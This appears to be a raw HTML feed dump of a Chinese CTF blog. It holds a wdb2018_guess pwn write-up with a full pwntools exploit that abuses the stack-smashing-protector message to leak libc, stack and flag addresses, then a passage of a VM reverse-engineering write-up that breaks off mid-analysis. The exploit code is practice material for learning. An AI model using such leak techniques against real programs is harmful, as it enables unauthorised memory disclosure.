class="string">b&#x27;\0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">read(<span class="number">0xff</span>,payload+<span class="string">b&#x27;\xe8&#x27;</span>+<span class="string">b&#x27;\0&#x27;</span>*<span class="number">7</span>+<span class="string">b&#x27;f&#x27;</span>*<span class="number">8</span>+p64(pop_rdi_ret))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> pwn </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>wdb2018_guess writeup</title>
      <link href="/2021/11/04/wdb2018_guess%20writeup/"/>
      <url>/2021/11/04/wdb2018_guess%20writeup/</url>
      
        <content type="html"><![CDATA[<p>buu刷题记录：<a href="https://buuoj.cn/challenges#wdb2018_guess">wdb2018_guess</a></p><span id="more"></span><h2 id="静态分析elf文件"><a href="#静态分析elf文件" class="headerlink" title="静态分析elf文件"></a>静态分析elf文件</h2><p>checksec一下发现开了NX和canary保护，64位程序，用ida分析看看</p><p>很明显的gets栈溢出，并且gets之后没有回显输入的内容，那这样的话意味着不能栈溢出劫持控制流了。那么看看前面，发现有一个把flag文件内容读到栈上面的动作。后面while循环调用了一个sub_400A11函数，v7=3，v6=0,，v7&gt;=v6 break就意味着这个函数会被调用三次。而发现sub_400A11函数是调用fork函数，fork函数会创建和当前进程一模一样的进程，然后范围自身进程的ID，如果是被创建的进程，那么fork将会返回0。</p><p>简单点就是fork的子进程会返回0，如果返回0那么break执行下面的内容，父进程因为返回自己进程号不会break则继续循环，然后调用fork，也就是说这个进程一共会产生3个子进程执行while循环之后的内容。</p><p>这里有一个特性，那就是在发生栈溢出之后stack_chk_fail。在终止程序之前还会打印argv[0]，这一点很合理。但是这里可以用于泄露栈上的flag，我们如果gets覆盖到argv[0]，就可以任意地址泄露了，但是因为只有三个子进程，就只能泄露三次，前两次一定要把栈地址泄露出来。但是呢现在栈地址是不知道的，我们可以先通过一次泄露泄露出libc的地址，二次泄露出栈地址，最后一次泄露flag。其实这里还有一点不太理解，就是fork之后栈是共享的嘛？libc是共享的很好理解，栈共享就不是很好理解了，还是说它栈不同，只是对应偏移的地方都有flag，然后我泄露的是别的进程上面的flag，倾向于这种解释。</p><h2 id="动态调试确定偏移"><a href="#动态调试确定偏移" class="headerlink" title="动态调试确定偏移"></a>动态调试确定偏移</h2><p>现在就需要知道这个buf到底需要多少字节能覆盖argv[0]，所以需要动调一波。断点下在fork循环之后，这里我选择了0x400b0d的位置，r。为了确定buf的位置，我们选择gets读入很多个a看看它与argv[0]之间的偏移。</p><p><img src="/2021/11/04/wdb2018_guess%20writeup/1.png" alt="1"></p><p>很容易可以从左边看出来，他们之间差了0x128个字节，那么payload就是0x128*b’a’+p64(要泄露内容的地址)。</p><p>第一次拿下libc之后第二次应该要拿__environ，这个我也是看writeup知道的，这个好像就是指向argv[0]的地址。也就是栈上的地址，这个是在libc里面的，所以拿到libc之后就可以泄露这个，然后再观察泄露的地址和flag的地址差多少，确定好偏移之后第三次就可以直接泄露flag了，这里测试之后是0x168的偏移，泄露的地址再减去0x168就是我们想要的flag了。</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">libc_version=<span class="string">&#x27;2.23&#x27;</span></span><br><span class="line">libc_in_local=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">conn</span>(<span class="params">x,file_name,port=<span class="number">9999</span></span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">str</span>(context.arch)==<span class="string">&#x27;amd64&#x27;</span>:bit=<span class="number">64</span></span><br><span class="line">    <span class="keyword">else</span>:bit=<span class="number">32</span></span><br><span class="line">    <span class="keyword">if</span> x:</span><br><span class="line">        p=process(file_name)</span><br><span class="line">        libc=ELF(<span class="string">&#x27;./libc/libc-&#x27;</span>+libc_version+<span class="string">&#x27;-&#x27;</span>+<span class="built_in">str</span>(bit)+<span class="string">&#x27;.so&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,port)</span><br><span class="line">        <span class="keyword">if</span> libc_in_local:libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:libc=ELF(<span class="string">&#x27;./libc/libc-&#x27;</span>+libc_version+<span class="string">&#x27;-buu&#x27;</span>+<span class="built_in">str</span>(bit)+<span class="string">&#x27;.so&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> ELF(file_name),libc,p</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_addr</span>(<span class="params">payload</span>):</span></span><br><span class="line">    p.recvline()</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;*** stack smashing detected ***: &#x27;</span>)</span><br><span class="line">    addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> addr</span><br><span class="line"></span><br><span class="line">elf,libc,p=conn(<span class="number">0</span>,<span class="string">&#x27;./GUESS&#x27;</span>,<span class="number">29108</span>)</span><br><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x128</span>+p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">libc_addr = leak_addr(payload1)-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;libc_Addr:&#x27;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x128</span>+p64(libc_addr+libc.sym[<span class="string">&#x27;__environ&#x27;</span>])</span><br><span class="line">stack_addr = leak_addr(payload2)-<span class="number">0x168</span></span><br><span class="line">success(<span class="string">&#x27;stack_addr:&#x27;</span>+<span class="built_in">hex</span>(stack_addr))</span><br><span class="line"></span><br><span class="line">payload3=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x128</span>+p64(stack_addr)</span><br><span class="line">p.sendline(payload3)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>成功getflag</p><p><img src="/2021/11/04/wdb2018_guess%20writeup/2.png" alt="2"></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> pwn </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>网鼎杯2020青龙组singal writeup</title>
      <link href="/2021/11/03/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84%20singal%20writeup/"/>
      <url>/2021/11/03/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84%20singal%20writeup/</url>
      
        <content type="html"><![CDATA[<p>不知不觉做到了虚拟机逆向了，曾经我也只是听说，还未曾想也能自己做出。</p><span id="more"></span><h2 id="静态分析文件"><a href="#静态分析文件" class="headerlink" title="静态分析文件"></a>静态分析文件</h2><p>exe文件，先查壳，没有壳直接ida打开。</p><p><img src="/2021/11/03/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84%20singal%20writeup/1.png" alt="1"></p><p>main函数逻辑还是比较简单的，先拷贝一串内存给v4，v4再作为第一个参数给vm_operad函数，第二个参数是114。</p><p>那么我们先提取它拷贝的内存，至于这段内存如何使用那就进去分析vm_operad函数了。很明显，这个第一个参数是int*类型的，并且也没有对a1做强制转换之类的关系，那么很明显这个内存是一个int数组，那么用提取成char数组之后再用int *类型去输出它就能得到对应的int数组。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> s[] =</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">0x0A</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x10</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x20</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0B</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0C</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x21</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0B</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0B</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x09</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x20</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x51</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x24</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x0C</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0B</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x25</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x36</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x41</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x20</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x25</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x09</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x20</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x41</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0C</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x3F</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x32</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x72</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x33</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x18</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xA7</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, </span><br><span class="line">  <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x31</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x28</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x84</span>, <span class="number">0xFF</span>, </span><br><span class="line">  <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, </span><br><span class="line">  <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x1E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x7A</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span></span><br><span class="line">&#125;; </span><br><span class="line"><span class="keyword">int</span> a[]=&#123;<span class="number">10</span>,<span class="number">4</span>,<span class="number">16</span>,<span class="number">8</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">32</span>,<span class="number">8</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">11</span>,<span class="number">1</span>,<span class="number">12</span>,<span class="number">8</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">8</span>,<span class="number">3</span>,<span class="number">33</span>,<span class="number">1</span>,<span class="number">11</span>,<span class="number">8</span>,<span class="number">11</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">8</span>,<span class="number">3</span>,<span class="number">32</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">81</span>,<span class="number">8</span>,<span class="number">4</span>,<span class="number">36</span>,<span class="number">1</span>,<span class="number">12</span>,<span class="number">8</span>,<span class="number">11</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">2</span>,<span class="number">37</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">54</span>,<span class="number">8</span>,<span class="number">4</span>,<span class="number">65</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">32</span>,<span class="number">8</span>,<span class="number">5</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">8</span>,<span class="number">2</span>,<span class="number">37</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">8</span>,<span class="number">3</span>,<span class="number">32</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">65</span>,<span class="number">8</span>,<span class="number">12</span>,<span class="number">1</span>,<span class="number">7</span>,<span class="number">34</span>,<span class="number">7</span>,<span class="number">63</span>,<span class="number">7</span>,<span class="number">52</span>,<span class="number">7</span>,<span class="number">50</span>,<span class="number">7</span>,<span class="number">114</span>,<span class="number">7</span>,<span class="number">51</span>,<span class="number">7</span>,<span class="number">24</span>,<span class="number">7</span>,<span class="number">-89</span>,<span class="number">7</span>,<span class="number">49</span>,<span class="number">7</span>,<span class="number">-15</span>,<span class="number">7</span>,<span class="number">40</span>,<span class="number">7</span>,<span class="number">-124</span>,<span class="number">7</span>,<span class="number">-63</span>,<span class="number">7</span>,<span class="number">30</span>,<span class="number">7</span>,<span class="number">122</span>&#125;;<span class="comment">//运行结果</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> *p=(<span class="keyword">int</span> *)s;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="built_in"><span class="keyword">sizeof</span></span>(s)/<span class="number">4</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d,&quot;</span>,*(p+i));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以很明显发现，这个数组刚好114。vm逆向基本是自己定义了指令集做运算的，所以这个不可能是flag，就应该是指令，那么至于指令集应该在这个函数有给解析，接着往下看。</p><h2 id="分析指令"><a href="#分析指令" class="headerlink" title="分析指令"></a>分析指令</h2><p>这里看了很久，里面有一个str 